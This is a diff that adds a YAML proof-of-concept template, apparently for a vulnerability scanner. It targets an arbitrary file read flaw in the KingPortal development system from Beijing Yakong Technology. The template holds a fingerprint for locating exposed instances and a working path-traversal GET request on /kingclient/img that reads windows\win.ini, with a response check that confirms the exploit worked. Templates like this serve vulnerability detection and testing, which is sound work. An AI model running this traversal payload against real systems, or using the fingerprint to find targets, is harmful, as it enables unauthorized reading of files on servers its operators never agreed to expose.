@@ -1,0 +1,15 @@
+id: poc-yaml-kingportal-img-anyfile-read
+info:
+  name: 北京亚控科技KingPortal开发系统 img 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: KingPortal开发系统
+  hunter: body="/public/javascripts/Common/Util/km_util.js"
+requests:
+- method: GET
+  path: /kingclient/img?imgPath=..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"bit
+    app support") && !contains(body,"<")
+variables: {}
+transport: http
